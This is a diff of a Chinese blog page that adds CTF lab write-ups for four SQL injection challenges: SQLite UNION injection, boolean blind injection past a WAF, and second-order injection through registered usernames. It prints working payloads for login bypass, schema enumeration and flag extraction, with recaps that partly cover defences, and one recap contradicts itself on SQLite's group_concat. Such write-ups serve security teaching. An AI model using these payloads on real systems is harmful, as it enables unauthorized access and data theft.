@@ -379,10 +379,10 @@
         <li><a href="#ezsql_13字符型-sql-注入---布尔盲注---无数据显示">EZSQL_13(字符型 SQL 注入 - 布尔盲注 - 无数据显示)</a></li>
         <li><a href="#ezsql_14字符型-sql-注入---时间盲注---无数据显示">EZSQL_14(字符型 SQL 注入 - 时间盲注 - 无数据显示)</a></li>
         <li><a href="#ezsql_15字符型-sql-注入---宽字节注入绕过-addslashes--union-联合查询注入">EZSQL_15(字符型 SQL 注入 - 宽字节注入绕过 addslashes + UNION 联合查询注入)</a></li>
-        <li><a href="#ezsql_16">EZSQL_16</a></li>
-        <li><a href="#ezsql_17">EZSQL_17</a></li>
-        <li><a href="#ezsql_18">EZSQL_18</a></li>
-        <li><a href="#ezsql_19">EZSQL_19</a></li>
+        <li><a href="#ezsql_16字符型-union-联合查询注入---sqlite-数据库">EZSQL_16(字符型 UNION 联合查询注入 - SQLite 数据库)</a></li>
+        <li><a href="#ezsql_17字符型-sql-注入---布尔盲注---waf-过滤函数组合--substr-子查询逐字符提取">EZSQL_17(字符型 SQL 注入 - 布尔盲注 - WAF 过滤函数组合 + substr 子查询逐字符提取)</a></li>
+        <li><a href="#ezsql_18字符型-sql-注入---二次注入second-order-injection--注册存储--查询触发">EZSQL_18(字符型 SQL 注入 - 二次注入（Second-Order Injection）- 注册存储 + 查询触发)</a></li>
+        <li><a href="#ezsql_19字符型-sql-注入---二次注入--union-联合查询注入---注册存储--登录查询触发">EZSQL_19(字符型 SQL 注入 - 二次注入 + UNION 联合查询注入 - 注册存储 + 登录查询触发)</a></li>
       </ol>
     </li>
   </ol>
@@ -512,7 +512,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 30 分钟
+                    阅读时长: 37 分钟
                 </time>
             </div>
         
@@ -529,7 +529,7 @@
 
 
 
-                <span class="article-time--wordcount">15022 字</span>
+                <span class="article-time--wordcount">18413 字</span>
             </div>
         
 
@@ -2443,11 +2443,250 @@ env 或 printenv 才能看见。</p>
 </div>
 </div><p>返回 <code>1:admin:admin123:flag{6746fd7a-7c7e-4681-a63a-2aa67e5b3d80}</code>，成功获得 flag</p>
 <p><strong>复盘</strong>：这题的核心是<strong>宽字节注入（Wide-Byte Injection）</strong>。后端使用 <code>addslashes()</code> 对单引号进行转义，但在 GBK 编码环境下，<code>%bf%5c</code> 构成一个合法的双字节字符，吞掉了转义用的反斜杠，使单引号逃逸。绕过方式是在注入的单引号前添加 <code>%bf</code>（或其他高字节如 <code>%81</code>~<code>%fe</code>）。防御时应使用 <code>mysql_set_charset()</code> 设置字符集而非 <code>addslashes()</code>，或统一使用参数化查询（Prepared Statements）</p>
-<h3 id="ezsql_16">EZSQL_16
-</h3><h3 id="ezsql_17">EZSQL_17
-</h3><h3 id="ezsql_18">EZSQL_18
-</h3><h3 id="ezsql_19">EZSQL_19
-</h3>
+<h3 id="ezsql_16字符型-union-联合查询注入---sqlite-数据库">EZSQL_16(字符型 UNION 联合查询注入 - SQLite 数据库)
+</h3><p>访问靶机，页面是一个登录表单，GET 方法提交 <code>username</code> 和 <code>password</code> 两个参数
+正常登录 <code>admin</code> / <code>admin</code>，返回 <code>Login failed.</code>
+测试单引号注入 <code>admin'</code>，页面返回 SQLite 报错信息：<code>SQLite3::query(): Unable to prepare statement: 1, near &quot;123&quot;: syntax error</code>，确认：</p>
+<ul>
+<li>后端使用 <strong>SQLite3</strong> 数据库</li>
+<li>单引号可以触发 SQL 注入</li>
+<li>报错信息回显，可以利用</li>
+</ul>
+<p>尝试注释绕过登录，SQLite 中 <code>--</code> 是行注释符：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?username=admin&#39;--&amp;password=123
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回 <code>Welcome admin</code>，登录成功，密码校验被绕过。SQL 语句变为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="c1">--&#39; AND password = &#39;...&#39;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>--</code> 注释掉了后续的密码检查部分</p>
+<p>页面只显示 &ldquo;Welcome admin&rdquo;，没有直接给出 flag，需要用 UNION 注入从数据库中提取。确定列数，依次测试：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?username=-1&#39; UNION SELECT 1,2,3,4--&amp;password=123
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>4 列时返回 <code>Welcome 2</code>，确认查询有 <strong>4 列</strong>，回显位在第 2 列。注意 SQLite 的 UNION 注入列数不匹配时会直接报错（<code>SELECTs to the left and right of UNION do not have the same number of result columns</code>），这有助于快速定位列数</p>
+<p>枚举数据库中的表，SQLite 没有 <code>information_schema</code>，使用 <code>sqlite_master</code> 系统表：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?username=-1&#39; UNION SELECT 1,name,3,4 FROM sqlite_master WHERE type=&#39;table&#39;--&amp;password=123
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回 <code>flag</code>，只有一张表</p>
+<p>查看 flag 表的结构：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?username=-1&#39; UNION SELECT 1,sql,3,4 FROM sqlite_master WHERE type=&#39;table&#39; AND name=&#39;flag&#39;--&amp;password=123
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回 <code>CREATE TABLE flag (id INTEGER, name TEXT, passwd TEXT, secret TEXT)</code>，四列：<code>id</code>、<code>name</code>、<code>passwd</code>、<code>secret</code></p>
+<p>直接 dump secret 列：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?username=-1&#39; UNION SELECT 1,secret,3,4 FROM flag--&amp;password=123
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回 <code>flag{507e1437-ec0d-432f-aa4c-dc7034a9ab82}</code>，成功获得 flag</p>
+<p><strong>复盘</strong>：这题的核心特征是后端使用 <strong>SQLite3</strong> 而非 MySQL/MariaDB。与 MySQL 注入的主要区别：</p>
+<ol>
+<li><strong>系统表不同</strong>：SQLite 使用 <code>sqlite_master</code>（存储表名和建表语句），而非 <code>information_schema.tables</code> / <code>information_schema.columns</code></li>
+<li><strong>注释符相同</strong>：<code>--</code> 行注释在 SQLite 和 MySQL 中通用，但 SQLite 中 <code>--</code> 后需要有空格才能正确注释（本题中 <code>--</code> 后直接跟 <code>&amp;</code> 即 URL 参数分隔符，相当于有隐含分隔）</li>
+<li><strong>列枚举方式不同</strong>：SQLite 无法从 <code>information_schema</code> 获取列名，但可以通过 <code>sqlite_master</code> 的 <code>sql</code> 字段直接读取 <code>CREATE TABLE</code> 语句获取完整表结构</li>
+<li><strong>没有 <code>group_concat</code></strong>：SQLite 原生支持 <code>group_concat()</code> 函数，但本题通过 <code>-1</code> 使原始查询无结果，UNION 注入只返回一行即可</li>
+</ol>
+<h3 id="ezsql_17字符型-sql-注入---布尔盲注---waf-过滤函数组合--substr-子查询逐字符提取">EZSQL_17(字符型 SQL 注入 - 布尔盲注 - WAF 过滤函数组合 + substr 子查询逐字符提取)
+</h3><p>访问靶机，页面是一个&quot;Employee Query&quot;员工查询系统，GET 方法提交 <code>id</code> 参数
+正常查询 <code>id=1</code>，返回&quot;查询成功&quot;，但页面<strong>不显示任何数据</strong>
+测试单引号注入 <code>id=1'</code>，返回&quot;未找到员工信息&quot;，没有 SQL 报错
+测试布尔条件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and 1=1-- (空格)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回&quot;查询成功&quot;</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and 1=0-- (空格)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回&quot;未找到员工信息&quot;，确认存在<strong>字符型布尔盲注</strong>，单引号闭合，<code>-- </code> 注释有效</p>
+<p>确定列数，测试 UNION 注入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=-1&#39; union select 1-- (空格)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回&quot;查询成功&quot;，确认查询只有 <strong>1 列</strong></p>
+<p>逐一测试函数可用性，发现 <code>if</code>、<code>sleep</code>、<code>benchmark</code>、<code>ascii</code>、<code>mid</code>、<code>substr</code>、<code>length</code>、<code>concat</code>、<code>extractvalue</code>、<code>updatexml</code> 等函数<strong>单独调用时均不被过滤</strong>。但将这些函数组合使用时（如 <code>length(database())</code>、<code>substr(flag,1,1)</code>）会返回&quot;未找到&quot;，说明 WAF 对<strong>函数嵌套组合</strong>做了检测</p>
+<p>关键突破：<code>exists()</code> 配合子查询可以绕过 WAF。<code>exists(select * from employees)</code> 返回&quot;查询成功&quot;，确认 <code>employees</code> 表存在。<code>exists(select * from flag)</code> 也返回&quot;查询成功&quot;，确认 <code>flag</code> 表存在。<code>exists(select flag from flag)</code> 确认 <code>flag</code> 表有 <code>flag</code> 列</p>
+<p>进一步发现 <code>substr()</code> 在子查询上下文中可以正常使用。构造如下 payload 逐字符提取 flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and substr((select flag from flag where id=1),1,1)=&#39;f&#39;-- (空格)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回&quot;查询成功&quot;，确认 flag 第 1 个字符为 <code>f</code></p>
+<p>编写自动化脚本，对每个位置遍历 <code>a-z0-9{}-</code> 字符集，通过响应是&quot;查询成功&quot;还是&quot;未找到&quot;判断字符是否匹配：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?id=1&#39; and substr((select flag from flag where id=1),N,1)=&#39;X&#39;-- (空格)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中 <code>N</code> 为位置，<code>X</code> 为当前测试的字符</p>
+<p>逐字符提取全部 42 个字符，得到 <code>flag{d35d3ee9-c8ac-4a56-9104-c7dc9d5af3fa}</code></p>
+<p><strong>复盘</strong>：这题的核心难点有三个：</p>
+<ol>
+<li><strong>WAF 过滤函数组合</strong>：单独的函数名不被拦截，但函数嵌套调用（如 <code>length(database())</code>）会被过滤。绕过方式是将字符串提取函数放在 <code>exists()</code> 的子查询中，避免直接嵌套</li>
+<li><strong>1 列查询 + 无数据显示</strong>：原始查询只有 1 列，且页面不显示查询数据，只能通过布尔盲注逐字符提取</li>
+<li><strong>注释符格式</strong>：<code>--</code> 后必须跟空格（<code>-- </code>）才能正确注释，URL 中编码为 <code>--+</code> 或 <code>%20</code> 均可</li>
+</ol>
+<h3 id="ezsql_18字符型-sql-注入---二次注入second-order-injection--注册存储--查询触发">EZSQL_18(字符型 SQL 注入 - 二次注入（Second-Order Injection）- 注册存储 + 查询触发)
+</h3><p>访问靶机，页面是一个&quot;用户中心&quot;，包含登录、注册、笔记功能
+正常注册用户 <code>testuser</code> / <code>test123</code>，登录成功后看到&quot;我的笔记&quot;和&quot;添加笔记&quot;功能
+测试登录接口的 SQL 注入，尝试各种 payload（单引号闭合、万能密码、注释符绕过等）均返回&quot;用户名或密码错误&quot;，登录接口<strong>无注入漏洞</strong>
+测试注册接口，注册 <code>admin'-- </code> 用户成功，说明注册时<strong>未对用户名做转义或过滤</strong>，恶意 SQL 语句被直接存入数据库
+用 <code>admin'-- </code> 用户名登录成功，页面显示&quot;欢迎回来，admin&rsquo;&ndash; &ldquo;，说明登录查询中 <code>--</code> 注释掉了密码校验部分，直接以该用户名登录
+访问&quot;我的笔记&quot;页面，发现返回了一条不属于当前注册用户的笔记内容：<code>flag{7b995369-7fd3-4c95-b2e4-7dcc3870c9bf}</code></p>
+<p><strong>漏洞原理分析</strong>：</p>
+<p>注册时，用户名 <code>admin'-- </code> 被直接存入数据库，没有任何转义。登录时，查询语句变为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="c1">-- &#39; AND password = &#39;...&#39;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>--</code> 注释掉了密码校验，登录成功</p>
+<p>查看笔记时，查询语句类似：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">notes</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">user_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="c1">-- &#39;)
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>--</code> 注释掉了后续条件，查询变成了：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">notes</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">user_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接返回了 admin 用户的笔记，而 admin 的笔记中存储着 flag</p>
+<p><strong>关键 payload</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">注册用户名: admin&#39;-- 
+</span></span><span class="line"><span class="cl">登录用户名: admin&#39;-- 
+</span></span><span class="line"><span class="cl">密码: 任意值
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>复盘</strong>：这题的核心是<strong>二次注入（Second-Order SQL Injection）</strong>。第一次操作（注册）时，恶意 SQL 代码被存入数据库；第二次操作（查看笔记）时，存储的恶意代码被取出并拼接到新的 SQL 查询中执行。与普通注入不同，二次注入的恶意代码经过了&quot;存储-取出-执行&quot;的过程，绕过了输入时的任何检查。防御时不仅要在输入时过滤，更要在<strong>从数据库取出数据用于拼接 SQL 时</strong>使用参数化查询或转义</p>
+<h3 id="ezsql_19字符型-sql-注入---二次注入--union-联合查询注入---注册存储--登录查询触发">EZSQL_19(字符型 SQL 注入 - 二次注入 + UNION 联合查询注入 - 注册存储 + 登录查询触发)
+</h3><p>访问靶机，页面与 EZSQL_18 相同，是一个&quot;用户中心&rdquo;，包含登录和注册功能。登录后只有&quot;我的笔记&quot;页面，没有&quot;添加笔记&quot;功能
+先尝试与 EZSQL_18 相同的二次注入思路，注册 <code>admin'-- </code> 用户并登录，访问笔记页面返回 <code>Welcome admin. Your secret note is empty.</code>，说明成功以 admin 身份查看笔记，但 admin 的笔记为空</p>
+<p>关键发现：笔记页面存在<strong>报错回显</strong>。注册 <code>x' union select 1,2,3-- </code> 用户并登录后访问笔记，返回 <code>查询异常：The used SELECT statements have a different number of columns</code>，说明：</p>
+<ul>
+<li>笔记查询使用了 UNION，且后端 SELECT 语句的列数不是 3</li>
+<li>注册时用户名未做转义，恶意 SQL 被存入数据库</li>
+<li>登录后查看笔记时，存储的用户名被取出拼接到查询中执行（二次注入）</li>
+</ul>
+<p>逐一测试列数，<code>union select 1,2</code> 时笔记页面显示 <code>2</code>，确认查询有 <strong>2 列</strong>，第 2 列回显在笔记中</p>
+<p>利用二次注入 + UNION 提取数据。注册时将 UNION 注入写入用户名，登录后查看笔记触发注入：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">注册用户名: x&#39; union select 1,database()-- 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>登录后查看笔记，返回 <code>user</code>，数据库名为 <code>user</code></p>
+<p>枚举表：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">注册用户名: x&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()-- 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回 <code>user_notes,users,flags</code>，发现 <code>flags</code> 表</p>
+<p>查看 flags 表结构：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">注册用户名: x&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;flags&#39;-- 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>返回 <code>flag</code>，只有一列</p>
+<p>直接提取 flag：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">注册用户名: x&#39; union select 1,flag from flags-- 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>登录后查看笔记，返回 <code>flag{979453e8-c4b5-4d1d-a109-d3391024c346}</code>，成功获得 flag</p>
+<p><strong>复盘</strong>：这题是 EZSQL_18 的进阶版。同样是二次注入，但 admin 的笔记为空，不能直接获取 flag。需要利用 <strong>UNION 联合查询注入</strong>，通过注册恶意用户名将 UNION 语句存入数据库，登录后查看笔记时触发注入，从 <code>flags</code> 表中提取数据。与 EZSQL_18 相比，这题多了两个关键点：</p>
+<ol>
+<li><strong>报错回显</strong>：列数不匹配时返回 MySQL 错误信息，帮助快速确定列数</li>
+<li><strong>UNION 注入利用</strong>：需要将整个查询替换为 UNION SELECT 来读取任意表的数据，而非仅利用注释符截断</li>
+</ol>
+
 </section>
 
 
